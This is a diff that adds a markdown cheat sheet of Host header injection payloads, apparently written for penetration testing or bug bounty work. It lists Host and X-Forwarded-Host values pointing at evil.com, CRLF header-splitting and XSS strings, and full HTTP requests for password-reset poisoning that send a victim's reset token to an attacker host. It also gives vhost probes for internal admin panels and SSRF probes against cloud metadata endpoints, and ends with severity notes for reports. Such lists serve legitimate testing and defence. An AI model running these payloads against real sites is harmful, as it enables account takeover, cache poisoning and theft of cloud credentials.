@@ -1,0 +1,110 @@
+# Host Header Injection Payloads
+
+## Core injection (turn Host into evil)
+```
+Host: evil.com
+Host: target.com.evil.com
+Host: evil.com@target.com
+Host: target.com#evil.com
+Host: target.com:evil.com
+Host: %65vil.com
+Host: target.com%0d%0a
+Host: "><script>alert(1)</script>
+Host: target.com..evil.com
+```
+
+## X-Forwarded-* variants (proxy/cloud reads these first)
+```
+X-Forwarded-Host: evil.com
+X-Forwarded-Host: target.com.evil.com
+X-Forwarded-Host: evil.com@target.com
+X-Forwarded-Host: target.com#evil.com
+X-Forwarded-Host: evil.com%0d%0aX-Injected: true
+X-Forwarded-Server: evil.com
+X-Forwarded-For: evil.com
+X-Forwarded-Port: 443
+X-Forwarded-Proto: http
+X-Host: evil.com
+X-Original-Host: evil.com
+X-Rewrite-URL: /
+Forwarded-Host: evil.com
+Forwarded: for=1.2.3.4;host=evil.com;proto=http
+```
+Combine multiple: some apps trust X-Forwarded-Host over Host.
+```
+Host: target.com
+X-Forwarded-Host: evil.com
+X-Forwarded-Proto: http
+```
+
+## Password reset poisoning (proof of concept)
+```
+POST /forgot-password HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@target.com
+```
+Then:
+```
+POST /api/forgot HTTP/1.1
+Host: evil.com
+Content-Type: application/json
+
+{"email":"victim@target.com"}
+```
+Watch the email `reset` URL for your evil host + token.
+
+## Auth-link poisoning via Host
+```
+GET /confirm-email?token=abc HTTP/1.1
+Host: evil.com
+```
+Check any "click here to verify" mail link reflects evil.com.
+
+## Routing + virtual host probing
+```
+GET / HTTP/1.1
+Host: 127.0.0.1
+Host: localhost
+Host: admin
+Host: internal
+Host: target-local
+Host: target.internal
+Host: jenkins
+Host: grafana
+Host: phpmyadmin
+Host: 10.0.0.1
+Host: 169.254.169.254
+```
+Any of these → different app/panel/error = vhost confusion → explore.
+
+## SSRF via Host in proxied endpoints (if proxy builds upstream from Host)
+```
+GET / HTTP/1.1
+Host: metadata.google.internal
+GET /?debug=1 HTTP/1.1
+Host: 169.254.169.254
+```
+Test on load-balancer/dynamic-tier hosts (not direct-proxy).
+
+## CRLF into Host (splitting headers)
+```
+Host: target.com%0d%0aX-OTP: 123456
+Host: target.com%23%0d%0aRefresh: 0;url=//evil.com
+Host: target.com\r\nSet-Cookie: session=evil
+```
+Result observed in response headers → CRLF injection confirmed → cache poisoning / cookie injection.
+
+## Absolute-URL poisoning
+```
+GET https://evil.com/ HTTP/1.1
+Host: target.com
+```
+Some proxies route by absolute URL; the app may reflect `https://evil.com` in link generation.
+
+## Reporting
+- Reset poisoning = High/Critical (account takeover).
+- Cache poisoning via Host = Medium-High.
+- Show victim email screenshot with evil Host in the **link** (not just header echo) for maximum impact.
